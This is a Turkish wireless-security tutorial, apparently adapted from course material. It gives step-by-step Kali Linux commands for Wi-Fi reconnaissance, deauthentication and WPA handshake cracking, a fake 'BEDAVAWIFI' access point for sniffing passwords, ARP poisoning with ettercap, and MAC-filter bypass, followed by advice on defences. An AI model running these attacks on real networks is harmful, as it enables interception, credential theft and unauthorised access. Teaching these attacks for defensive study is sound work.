# KABLOSUZ AĞ GÜVENLİĞİ

• Yeni kablosuz ağ kartının sistemde çalışır olup olmadığını öğrenmek için konsol kısmına
 “sudo dmesg” komutu yazılır.
 
 Bunun monitör moda alınması için komut satırına sudo airmon-ng start wlan0 yazılır. 
 
 <h3>KABLOSUZ AĞLARDA KEŞİF YAPMA</h3>
 
 Kablosuz ağların keşfi, yakın çevredeki internet erişim noktalarının bulunmasıdır. Keşif araçlarını taşınabilir hâle getirerek etrafta bulunan kablosuz ağları keşfetme işlemine wardriving, bu
noktaların özelliklerinin işaretlenmesine ise warchalking denir.

Yakın çevredeki AP’leri bulmak için Kali Linux işletim sisteminde Kismet, Wireshark, airodumpng, wifite isimli araçlar kullanılır. Kablosuz ağların keşfi, pasif ve aktif olmak üzere ikiye ayrılır.

**Aktif Keşif**: Yetkisiz biri tarafından çeşitli programlar kullanılarak ağ ortamındaki açık yayın
yapan Access Pointleri ve özelliklerini tespit etme işlemidir. Bu tarz keşif çalışmaları için kullanılan
programlar kablosuz ağ ortamında keşif çalışması yaparken kendini belli eder. AP cihazına sinyal
gönderir ve AP cihazının, kendini ağ ortamında anons etmesini ister. AP cihazı, kendine izin verirse
ağ ortamında bulunan cihazları raporlandırır.

**Pasif Keşif**: Yetkisiz biri tarafından çeşitli programlar kullanılarak, ağ ortamındaki bir AP
cihazından izin almadan ağa bağlı cihazları tespit etme işlemidir. Pasif keşif, gizli bir şekilde
dinleme yapma veya trafik analizi olabilir. Kismet, Wireshark, wifite, airodump-ng pasif keşif
araçlarıdır.
Kali Linux işletim sisteminde bulunan Kismet isimli araç en önemli pasif keşif aracıdır. Kismet
aracı kablosuz ağ adaptörünü monitör modda çalıştırarak yakın çevredeki kablosuz ağ ortamını
izler, ağa bağlı bütün cihazların isimlerini ve özelliklerini raporlandırır.
Kismet ile dinleme yapılırken etraftaki erişim noktaları veya istemciler rahatsız edilmez. Kismet
tamamen pasif modda bir dinleme yapar. Özellikle şifresiz bir iletişim yöntemi tercih edilmişse
Kismet bu noktada kablosuz ağdaki tüm cihazları ve veri akışını görebilir.
Kismet, kablosuz ağlarda izinsiz giriş tespiti için de kullanılabilir. Ağa erişim izni olmayıp da
giriş deneyiminde bulunan kullanıcılar, Kismet tarafından kolayca belirlenerek raporlandırılır.

Keşif işlemleri sonucunda elde edilen bilgiler şunlardır:

• Kablosuz ağ şifreli ise şifreleme protokolü (WEP, WPA, WPA2)

• Ağa bağlı cihazların MAC adresleri

• Ağa bağlı cihazların IP adresleri

• Ağa bağlı cihazların isimleri

• Ağ ortamındaki bütün veri trafiği

• Gizlenmiş SSID’ler

**Kali İşletim Sistemindeki Airodump-ng Aracını Kullanarak Çevredeki Erişim Noktaları ve
Bunlara Bağlı Cihazlar Hakkında Bilgi Toplama**

1. Adım: Ağ kartının gerekli kurulumunu yaptıktan sonra Kali işletim sistemi konsol ekranına
**sudo airmon-ng start wlan0** yazarak ağ kartını monitör moda alınız.

2. Adım: Komut satırına **sudo iwconfig** yazarak, ağ kartının monitör moda geçip geçmediğini
kontrol ediniz.

3. Adım: Ağ kartı monitör moda geçmişse konsol ekranına sudo airodump-ng wlan0 (ağ kartı
wlan0 için) yazınız. 

4. Adım: Kablosuz ağ kartının çevredeki kablosuz cihazları tespit ettiğini ve bunlarla ilgili
bilgileri topladığını görünüz.

<hr>

**Kali İşletim Sistemindeki Airodump-ng Aracını Kullanarak Çevrede Gizlenmiş Erişim
Noktalarını (SSID) Bulma**

1. Adım: Kali Linux konsol satırına sudo airmon-ng start wlan0 yazarak ağ kartını monitör
moda geçiriniz.

2. Adım: Komut satırına sudo iwconfig yazarak, ağ kartının monitör modda olup olmadığını
kontrol ediniz.

3. Adım: Komut satırına sudo airodump-ng wlan0 yazarak kablosuz ağ için tarama başlatınız.

4. Adım: Gizli ağlar <length : 0> olarak gösterilmiştir . Bu erişim noktasının MAC
adresini kullanarak diğer bilgileri elde etmek için komut satırına sudo airodump-ng --bssid
<Hedef MAC Adresi> -c <kanal no> wlan0 yazınız.
  
<img src="https://github.com/FazzPy/security/blob/main/img/airodump.PNG">
 
5. Adım: Biraz bekledikten sonra hedef MAC adresini dinleyerek station ve probes gibi bütün
bilgileri ekranda görünüz. STATION ile bulunan MAC adresi, erişim noktasına bağlı
cihazın MAC adresidir. Erişim noktası MAC adresi ise BSSID bölümünde gösterilmiştir.
  
<hr>
  
 <h3>Kali İşletim Sistemindeki İwlist Aracını Kullanarak Kablosuz Ağlar Hakkında Bilgi Toplama</h3>
 
1. Adım: Kali Linux konsol satırına sudo airmon-ng start wlan0 yazarak ağ kartını monitör
moda geçiriniz.
 
2. Adım: Komut satırına sudo iwconfig yazarak, ağ kartının monitör modda olup olmadığını
kontrol ediniz.
 
3. Adım: Komut satırına sudo iwlist wlan0 scanning yazarak kablosuz ağ için tarama başlatınız 

<img src="https://github.com/FazzPy/security/blob/main/img/iwlist.PNG">
 
Bu komut ile yakın çevredeki kablosuz erişim cihazlarının özeliklerine ait aşağıdaki bilgiler
tespit edilir.
 
SSID (Service Set Identifier): Wi-Fi ağının adıdır.
 
BSSID: Kablosuz interneti dağıtan modem veya Access Point MAC adresidir.

Yetkilendirme Türleri: WPA, WPA2, WEP
 
Sinyal Gücü: Bir modemin sinyal gücü dbm kavramı ile ifade edilir. Dbm kelime anlamı olarak
sinyal gücü seviyesinin desibel cinsinden birimidir. Sinyal gücü bazı dbm değerlerine göre farklılık
gösterir. Örneğin -30 dbm çok güçlü sinyal anlamına gelir. Buradan daha küçük değerlere gittikçe
bu değer -90’da sonlanır. -90 neredeyse hiç çekmeyen bir sinyal gücü anlamına gelir.
 
Kanal Numarası: Farklı frekanslarda 1-14 arası yayın kanalı vardır. AP (Erişim Noktası) ve STA
(İstasyon, Kablosuz Ağ İstemcisi) bir kanaldan iletişim kurar.
 
MAC Adresi: Ağ arabirim kartının kendine özel numarasıdır. MAC adresleri 0-9 arası
rakamlardan ve A-F arasındaki harflerden oluşur. Bu adres, ağ arabirim kartı üretildiği zaman
üretici firma tarafından verilir.
 
<h3>Kali İşletim Sistemindeki Airodump-ng Aracıyla Kablosuz Ağda WPA2 Şifreleme Türünü
 Kullanan Erişim Noktalarını Tespit Etme </h3>
 
Aşağıdaki işlem adımlarına göre airodump-ng aracının encrypt parametresiyle kablosuz
ağdaki erişim cihazlarından WPA2 şifreleme türünü kullananları bulunuz.
 
 1. Adım: Kali Linux konsol satırına sudo airmon-ng start wlan0 yazarak ağ kartını monitör
moda geçiriniz.
 
 2. Adım: Komut satırına sudo iwconfig yazarak, ağ kartının monitör modda olup olmadığını
kontrol ediniz.
 
 3. Adım: Komut satırına sudo airodump-ng wlan0 --encrypt wpa2 yazarak kablosuz ağ için
tarama başlatınız.
 
 <img src="https://github.com/FazzPy/security/blob/main/img/airodump.PNG"></img>
 
 <h3>KABLOSUZ AĞLARDA GÜVENLİK ZAFİYETLERİ </h3>
 
 Kablosuz ağların sağladığı kolay kurulum, esneklik, hareketlilik gibi avantajlar günümüzde
kablosuz ağ kullanımını yaygınlaştırmıştır. Kablosuz ağların kullanımının artması bazı güvenlik
endişelerini de beraberinde getirmiştir.
Kablosuz ağlardaki güvenlik riskleri, kablolu ağlardaki risklerle aynıdır fakat kablosuz iletişimin
hava ortamında yapılması yeni zafiyetleri ortaya çıkarmıştır. Bu zafiyetler aşağıda verilmiştir. 

 <h3>Ağ Trafiğinin Dinlenmesi ve Şifrelemenin Çözülmesi</h3>
 
 Kablosuz ağlarda erişim cihazları paylaşılan veriyi radyo dalgaları aracılığıyla korumasız
hava ortamına gönderir ve bu veri trafiği ortamdaki diğer kablosuz cihazlar tarafından dinlenip
kaydedilir. Veri paylaşımında kullanılan şifrelemenin zayıf olması durumunda kötü niyetli kişiler
şifrelemenin açıklarını kullanarak veri paketlerini çözebilirler. Çözülen bu paketler sayesinde
yazışmalar, parolalar, e-postalar, internette sörf yapan kişilerin kişisel bilgileri veya ilgi alanları
gibi bilgiler açığa çıkabilir.
 
 **Kali Linux İşletim Sistemi Araçlarını Kullanarak Kablosuz Ağda Dinleme, Saldırı Yapma, Veri
Paketi Yakalama ve Bu Paketleri Çözümleme**
 
 1. Adım: Kali Linux konsol satırına sudo airmon-ng start wlan0 yazarak ağ kartını monitör
moda geçiriniz.
 
 2. Adım: Komut satırına sudo iwconfig yazarak, ağ kartının monitör modda olup olmadığını
kontrol ediniz.

 3. Adım: Komut satırına sudo airodump-ng wlan0 yazarak çevredeki erişim noktalarını tespit
ediniz.
 
 4. Adım: Hedef cihazın MAC adresini ve kanal numarasını seçiniz
 
 <img src="https://github.com/FazzPy/security/blob/main/img/airodump1.PNG">
 
 5. Adım: Komut satırına sudo airodump-ng --bssid Hedef Cihaz MAC Adresi -c Kanal No
wlan0 yazınız. Seçilen hedef cihazı dinlemeye alarak bu cihaza bağlanan istemcileri ve MAC
adreslerini bulunuz
 
<img src="https://github.com/FazzPy/security/blob/main/img/airodump2.PNG">
 
 6. Adım: Komut satırına sudo airodump-ng -c Hedef Cihaz Kanal No --bssid Hedef Cihaz
MAC Adresi -w /root/kali/Desktop/deneme yazınız. Seçilen hedef cihazla belirtilen kanal
numarasından bağlantı kurup, yapılan görüşmelerden bir bilgi paketi yakalayarak deneme.cap
ismi ile masaüstüne kaydediniz.
 
 <img src="https://github.com/FazzPy/security/blob/main/img/airodump3.PNG">
 
 7. Adım: Başka bir komut penceresi açınız ve komut satırına sudo aireplay-ng --deauth 0
-a –bssid Hedef Cihaz MAC Adresi –c Hedefe Bağlı Olan istemci MAC Adresi wlan0 yazınız. Bu
işlem ile hedef erişim noktası ve istemci cihaz arasına girerek sahte kimlik doğrulama paketleri
gönderiniz.
 
 Bu işlemde kullanılan --deauth 0 ile çok sayıda sahte kimlik doğrulama paketini, -a ile parolasını
kırmak istediğiniz hedef erişim noktasını, -c ile de hedef erişim cihazına bağlı istemcinin MAC
adresini belirttiniz.
 
 <img src="https://github.com/FazzPy/security/blob/main/img/airodump4.PNG">

 Bu işlem sonucunda hedef erişim noktasına bağlı cihazın bağlantısı sonlanır ve erişim noktası
ile el sıkışma olayı (handshake) gerçekleşir.
 
 <img src="https://github.com/FazzPy/security/blob/main/img/airodump5.PNG">
 
 8. Adım: Başka bir komut penceresi açınız ve komut satırına sudo aircrack-ng –w /home/
kali/Desktop/rockyou.txt /home/kali/Desktop/deneme-01.cap yazınız. Bu komut
satırı ile yakalanan deneme-01.cap isimli dosya çözümlenmeye başlar ve masaüstünde bulunan
rockyou.txt isimli dosyadaki şifrelerle karşılaştırılarak hedef cihazın WPA şifresi kırılır. WPA şifresi
rockyou isimli dosya içinde olan bir şifre ise ekranda bu şifreyi gösterir, değilse şifre bulunamadı
yazar. 
 
 <img src="https://github.com/FazzPy/security/blob/main/img/aircrackng.PNG">
 
 
 9. Adım: Şifre çözümleme işlemi uzun sürer. Bir ekran görüntüsü ile
karşılaşıncaya kadar bekleyiniz.
 
 <img src="https://github.com/FazzPy/security/blob/main/img/aircrackng1.PNG">
 
 <h3>Sahte Kablosuz Ağ Oluşturma</h3>
 
 Kablosuz ağa bağlanan yetkisiz kişiler, ortama sahte erişim noktaları ekleyebilirler ya da kendi
kablosuz ağ cihazlarını bazı işlemlerle bir erişim noktasına dönüştürebilirler. Bu kişiler kablosuz
ağın kaynaklarını ya kendileri kullanır ya da başka kişilerle paylaşır. 
 
 1. Adım: Kali Linux’a ilgili adaptör bağlantısını yaptıktan sonra iwconfig komutu ile arabirimleri
görünüz.
 
 2. Adım: Komut satırına sudo airmong-ng start wlan0 yazarak ağ arabirim kartını monitör
moda geçiriniz.
 
 3. Adım: Komut satırına sudo airodump-ng wlan0 yazarak etraftaki kablosuz erişim noktalarını
keşfediniz.
 
 4. Adım: Komut satırına sudo apt-get install dhcp3-server yazarak DHCP Server’i yükleyiniz.
 
 5. Adım: DHCP Server yüklenmediyse dosyayı internetten indirip, sudo tar -xvf isc-dhcp-server.
tar.gz yazarak yükleyiniz.
 
 6. Adım: Komut satırına dpkg -i isc.dhcp.server.dep yazarak ilgili paketleri yükleyiniz.
 
 7. Adım: Komut satırına reboot yazarak sistemi yeniden başlatınız. İlgili .dep paketini sisteminize yükledikten sonra Kali’yi yeniden başlatınız.
 
 8. Adım: IP aralığı verebilmek için DHCP servisinin conf dosyasını aşağıdaki gibi düzenleyiniz.
 
 nano /etc/dhcp3/dhcpd.conf
 
 default-lease-time 600;

 max-lease-time 7200;
 
 authoritative;
 
 subnet 10.0.0.0 netmask 255.255.255.0 {
 
 option subnet-mask 255.255.255.0;
 
 option broadcast-address 10.0.0.255;
 
 option routers 10.0.0.254;
 
 option domain-name-servers 8.8.8.8;
 
 range 10.0.0.1 10.0.0.140;
 
 }
 
 9. Adım: Komut satırına airbase-ng -e BEDAVAWIFI -c 11 -v wlan0 yazarak BEDAVAWIFI isimli
sahte kablosuz ağı oluşturunuz.
 
 10. Adım: at0 adında sanal arabirim eklemek için aşağıdaki kod satırlarını yazınız.<br>
 ifconfig at0 up<br>
 ifconfig at0 10.0.0.254 netmask 255.255.255.0<br>
 
 11. Adım: Komut satırına route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.254 yazarak sahte kablosuz ağ için router ayarlarını yapınız.
 
 12. Adım: Sahte kablosuz ağ için iptable ayarlarını aşağıdaki komut satırlarını yazarak oluşturunuz.<br>
 iptables --flush<br>
 iptables --table nat --flush<br>
 iptables --delete-chain<br>
 iptables --table nat --delete-chain<br>
 iptables -P FORWARD ACCEPT<br>
 
 13. Adım: Komut satırına iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE yazarak
sahte kablosuz ağa gelecek bağlantıların yönlendirilmesini sağlayınız
 
 14. Adım: Komut satırına dhcpd -d -f -cf /etc/dhcp3/dhcpd.conf at0 & yazarak DHCP servisini
başlatınız.
 
 15. Adım: Komut satırına echo “1” > /proc/sys/net/ipv4/ip_forward yazarak gelecek IP’leri
yönlendiriniz.
 
 16. Adım: Bu işlemlerden sonra BEDAVAWIFI isimli sahte kablosuz ağ çalışmaya başlamıştır. 
 Oluşturulan bu sahte kablosuz ağ sayesinde ağa bağlanan cihazların hangi IP
numarasını alıp internette hangi sayfalara gittiğine, dnschef ile dns yönlendirmesi yaparak bakınız
veya tcpdump ile HTTP trafiğinde parola bilgilerini görünüz.
 
 
 <img src="https://github.com/FazzPy/security/blob/main/img/freewifi.PNG">
 
 <h3>Ağ Topolojisinin Ortaya Çıkması</h3>
 
 Yetkisiz kişiler tarafından kablosuz ağdaki şifrelemenin çözülmesi durumunda veri trafiği
izlenerek kurumların iç ağ topolojisi ortaya çıkarılabilir. 
 
 <h3>Veri Kaybı ve Veri Kullanma</h3>
 
 Kablosuz ağa yetkisiz bağlanan kişiler; ağdaki bilgisayarlar üzerinde saklanan verileri ele
geçirebilirler, ağı gizlice izleyerek gönderilen bilgi paketlerini değiştirebilirler, saklanan veya
kullanılan verileri kullanılmaz hâle getirebilirler.
 
 <h3>IP Numaralarının Yasal Olmayan İşlerde Kullanılması</h3>
 
 Yetkisiz kişiler, kablosuz ağa erişerek ağa bağlı cihazların IP numaralarını alabilirler ve yasa dışı
işlerde bu IP numaralarını kullanabilirler. 
 
 ARP (Adres Çözümleme Protokolü), IP adresi bilinen bir bilgisayarın MAC adresini öğrenmeye
yarayan bir protokoldür. ARP tablosunda bilgisayarların IP numaraları ve MAC adresleri bulunur.
ARP tablosuna Windows işletim sistemlerinde arp -a, Linux işletim sistemlerinde ise arp yazarak
ulaşılabilir. Bir saldırgan, ARP spoofing ile bir şirketten ve kullanıcıdan hassas verileri çalabilir.
 
 <h3>Kali Linux İşletim Sistemindeki Ettercap Aracını Kullanarak ARP Zehirlemesi Saldırısını Yapma</h3>
 
 1. Adım: Kali Linux’a ilgili adaptör bağlantısını yaptıktan sonra iwconfig komutu ile arabirimleri
görünüz.
 
 2. Adım: Komut satırına sudo airmong-ng start wlan0 yazarak ağ arabirim kartını monitör
moda geçiriniz.
 
 3. Adım: ARP spoofing yapmak için komut satırına ettercap -G yazınız veya Applications
menüsünden Sniffing/Spoofing > ettercap-graphical seçiniz.
 
 4. Adım: Ettercap ekranının Setup bölümünde kablosuz ağ kartı kullanıyorsanız wlan0, sanal
makine içinde bir işletim sistemi hedef cihaz ise eth0 seçiniz.
 
 <img src="https://github.com/FazzPy/security/blob/main/img/ettercap.PNG">
 
 5. Adım: Ağ kartı ayarlarından sonra host cihazlarını bulmak için tarama yapınız.
 
 6. Adım: Hedef cihazların IP numaralarını ve MAC adreslerini listeleyiniz. Bu listeden 192.168.
1.1 (default gateway) seçerek Target1 butonunu tıklayınız.
 
 7. Adım: Hedef cihaz IP numarasını seçerek Target2 butonunu tıklayınız. 
 
 8. Adım: Hedefleri belirledikten sonra sağ üst bölümden ARP poisoning kutucuğunu seçip
atağı başlatınız.
 
 <img src="https://github.com/FazzPy/security/blob/main/img/ettercap1.PNG">
 
 9. Adım: Bu aşamalardan sonra bütün ağ trafiğinin bilgisayarınız üzerinden aktığını görünüz.
Wireshark yazılımı ile kurban cihazın ağ ve internet üzerindeki trafiğini izleyiniz.

 
 <h3>Verilen Hizmetin Aksatılması</h3>
 
 Saldırganların yaptığı siber ataklar, ağ ortamındaki kullanıcıların ağ iletişimi için belirledikleri
kullanıcı adı ve şifrelerini kullanamamasına veya kullanıcıların web hizmetine bağlanamamasına
yol açar. Bu durum, işlerin aksamasına neden olur.
 
 <h3>Kali Linux İşletim Sistemindeki Macchanger Aracını Kullanarak MAC Adresi Filtrelemelerini
  Aşma</h3>
 
 1. Adım: Kali Linux konsol satırında sudo airmon-ng start wlan0 yazarak ağ kartını monitör
moda geçiriniz.
 
 2. Adım: Komut satırına sudo iwconfig yazarak, ağ kartının monitör modda olup olmadığını
kontrol ediniz.
 
 3. Adım: Komut satırına sudo airodump-ng wlan0 yazarak kablosuz ağ için tarama başlatınız.
 
 4. Adım: Hedef cihaz MAC adresi belirlenmiştir. Bu MAC adresini kullanarak
erişim noktasının MAC adresini ve diğer bilgilerini elde etmek için komut satırına sudo airodumpng --bssid <Hedef MAC Adresi> -c <kanal no> wlan0 yazınız.
 
 <img src="https://github.com/FazzPy/security/blob/main/img/macchanger1.PNG">
 
 5. Adım: Hedef cihazın MAC adresi ve diğer bilgileri elde edildikten sonra kendi MAC adresinizi
bulmak için komut satırına sudo macchanger --show wlan0 yazınız.
 
 <img src="https://github.com/FazzPy/security/blob/main/img/macchanger2.PNG">
 
 6. Adım: Komut satırına **sudo ifconfig down** yazarak monitör moddan çıkınız.
 
 7. Adım: Komut satırına **sudo macchanger --mac= <Hedef Mac Adresi> wlan0** yazınız. Bu işlem
sonucunda MAC adresiniz hedef MAC adresiyle aynı olur.
 
 8. Adım: Bu işlem sonucunda aynı MAC adresine sahip iki cihaz ağda bulunmaktadır. Aireplayng ve parametreleri kullanarak hedef cihazı ağdan düşürünüz. Daha sonra monitör moddan
çıkarak erişim noktasına yetkisiz bağlanınız.
 
 <h3>KABLOSUZ AĞLARDA GÜVENLİK </h3>
 
 Kablosuz ağ güvenliği, çevrimiçi ortamlarda kullanılan verilere yetkisiz kişilerin erişmesini
engellemek için alınan önlemlerin bütünüdür.
Büyük holdinglerden teknolojiden az anlayan bireylere kadar herkesin bu konuda dikkatli
olmasını gerektiren birçok neden vardır. Bireyler, önemli bilgilerinin başka kişilerin eline
geçmesiyle istenmeyen sonuçlarla karşılaşabilir. İşletmeler için ise böyle bir durumda ekonomik
kayıplardan söz edilebilir. Güvenli bir kablosuz ağ oluşturmak için yapılacak işlemler aşağıda
verilmiştir. 
 
 **Aygıt Yazılımlarını Güncelleme*
 
 Kablosuz ağ cihazları üreten firmalar, ürünlerinde güvenlik açıkları tespit ettiklerinde bunları
onarmak ve güncellemek için kendi web sayfalarında güncelleme dosyaları yayımlar. Güncelleme
işlemi periyodik olarak yapılır.
 
 **Yönetici İşlemleri**
 
 Yönetici işlemleri kablosuz ağda yapılmaz. Uzaktan erişim devre dışı bırakılır. Routerda yönetici
işlevleri gerçekleştirilecekse bilgisayar kablosuz ağa değil, bir ethernet kablosu ile internete
bağlanmalıdır.

 **HTTPS Kullanma**
 
 HTTPS, bir web sitesinden gönderilen ve alınan verilerin şifrelenmesini sağlar. Bu sadece
internet kullanıcıları için değil, işletmeler için de önemlidir çünkü web sitesinin ziyaretçilerine
onları kötü amaçlı faaliyetlerden korumak için belirli önlemlerin alındığını gösterir.

 **Varsayılan Ayarları Değiştirme**
 
 Kurulum işlemi sırasında varsayılan kullanıcı ayarları, şifreleri ve ana bilgisayar adları
değiştirilmelidir. Rakam, büyük harf / küçük harf ve özel karakterler içeren en az 10 haneli güçlü
bir şifre kullanılmalıdır. Varsayılan olarak router modelini veya markasını belirten ad başka bir
isim ile güncellenmelidir.
Ayrıca bazı routerlar otomatik olarak WPS (Wi-Fi Protected Setup, Wi-Fi Korumalı Kurulum) ile
birlikte gelir. Bu ayar değiştirilmelidir çünkü WPS, WPA2 ile çalışan bir routerın en büyük güvenlik
açıklarından biridir.
Servis Seti Tanımlayıcısı (SSID-Service Set Identifier,) değiştirilmelidir çünkü bu durum,
bilgisayar korsanlarının tam olarak ne tür bir router kullanıldığını öğrenmelerine yol açar. Belirli
routerların kendilerine has güvenlik açıkları vardır. Bu nedenle kötü amaçlı insanların Wi-Fi
sinyallerinin yayılması için tam olarak hangi routerın kullanıldığını bilmelerine gerek yoktur.
 
 **Erişim Cihazının Yeri**
 
 Kablosuz internet, radyo sinyallerinin yayınlanması yoluyla çalışır. Bu nedenle daha güçlü bir
Wi-Fi güvenliği için bu radyo sinyallerine iş veya ev dışındaki kişilerin erişimi zorlaştırılmalıdır.
Router sinyal mesafesinin uzunluğundan endişe duyuluyorsa ayarlamalar manuel olarak da
değiştirilebilir.
 
 **Şifre Güncelleme**
 
 Wi-Fi şifresinin düzenli olarak değiştirilmesi genel Wi-Fi güvenliği açısından önemlidir. Şifreler
uzun ve değişik olmalıdır. WPA2 için kullanılabilecek maksimum şifre uzunluğu 64 karakterdir.
 
 Şifrede büyük ve küçük harfler, sayılar ve özel karakterlerin kullanımı unutulmamalıdır. Ayrıca asla sözlükte bulunabilecek bir kelime kullanılmamalıdır çünkü bunlar sözlük saldırıları ile
bilgisayar korsanları tarafından kırılabilir.
 
 **Güvenlik Duvarı**
 
 Tüm routerların içinde yerleşik olarak bulunan güvenlik duvarları (firewall) vardır. Cihazın bu
özelliği aktif olmalıdır. Güvenlik duvarının durumu routerın yöneticisinden kontrol edilebilir. Bu,
kablosuz ağ güvenliğinin hayati bir parçasıdır.
 
 **WPA2 Kullanma**
 
 WPA2 şifrelemesinden daha az güvenli olan sistemlerin (WPA, WEP) kırılması kolaydır. WEP
çok eski bir şifrelemedir ve iyi bir bilgisayar korsanı tarafından birkaç dakika içinde kırılabilir. Tek
seçenek WEP ise kullanılan cihazın yazılımı güncellenmelidir.
 
 **AES Şifreleme**
 
 Routerın tek güvenlik protokolü olarak AES (Advanced Encryption Standart, Gelişmiş Şifreleme Standardı) seçilmelidir. AES/TKIP seçeneği ideal değildir çünkü bu durumda router, AES ve TKIP arasında geçiş yapabilir ancak TKIP’nin güvenlik açıkları vardır.

**WPS Ayarları**
 
 WPS, Wi-Fi korumalı kurulum anlamına gelir ve genellikle routerın alt kısmında bulunan sekiz
rakamlı bir koddan oluşur. WPS, routerın WPA2 kablosuz ağına başka bir giriş noktası görevi görür.
 
 <h3>KABLOSUZ AĞ SALDIRI TESPİT SİSTEMLERİ</h3>
 
 İstenmeyen durumların tespitinde kullanılan sistemlere saldırı tespit sistemi denir. Kablolu ve
kablosuz ağlarda istenmeyen durumların tespiti için birçok saldırı tespit sistemi geliştirilmiştir.
Bir güvenlik uygulaması olan saldırı tespiti, siber saldırıları en aza indirmek ve yeni tehditleri
engellemek için kullanılır. Saldırı tespit sistemleri, uygulama yöntemlerine ve uygulandıkları
ortama göre çeşitli sınıflara ayrılır.
 
 **Kablosuz Ağ Saldırı Tespit Sistemleri (WIDS)**
 
 WIDS; ağdaki erişim noktalarının doğrulanmasını, orada olmaması gereken veya güvenlik
sorunları olan noktaların belirlenmesini, AP’lere yönelik saldırıların tespit edilmesini sağlayan
sistemlerdir.
 
 **WIDS Araçları**
 
 AP menzilindeki RF trafiğini koklamak ve cihazları tanımlamak için araçlar mevcuttur. Bu
araçların açık kaynaklı ve ücretli çeşitleri vardır. Bunları kullanmak, yetkisiz cihazların keşfedilmesini ve güvenliği kırma girişimlerinin öğrenilmesini sağlar. Bu araçlar, bilgileri günlüğe kaydeder
ve bir ihlal girişimi keşfettiklerinde kullanıcıya uyarı verir.
Kali Linux işletim sisteminde bulunan Kismet, 802.11 için tasarlanmış bir kablosuz ağ
detektörüdür. Menzil içindeki tüm cihazların tanımlanması veya tek bir cihazın izlenmesi
dâhil olmak üzere birden fazla kullanıma sahiptir. İzinsiz giriş tespiti için bu araç kullanılabilir.
 
 **Kablosuz Ağ Saldırı Önleme Sistemi (WIPS)**

 Kablosuz saldırı önleme sistemi (WIPS), bir radyo spektrumunu izleyerek ve olağandışı ağ
etkinliği arayarak yetkisiz ağ erişimini önler. WIPS; hileli erişim noktalarını belirlemeye, güvenlik
profesyonellerinin olası sahtekârlık saldırılarına, ortadaki adam saldırılarına veya hizmet reddi
saldırılarına hazırlanmasına yardımcı olabilir.
Kablosuz saldırı önleme sistemi, haricî bir kablosuz yönlendirici veya başka bir ekipman
kullanılarak ağda güvenlik açığının önlenmesine yardımcı olabilir. WIPS bunu sinyallerin ağın
rutin parçaları mı, meşru erişim noktaları mı olduğunu veya belirli bir etkinliğin yetkisiz olup
olmadığını belirleyerek yapar. Güvenlik sistemleri daha sonra olası saldırılara yanıtlar oluşturur.

 Saldırı engelleme sistemi yazılımları; Snort, Suricata, Bro (Zeek) ve OSSEC’dir.
 

 
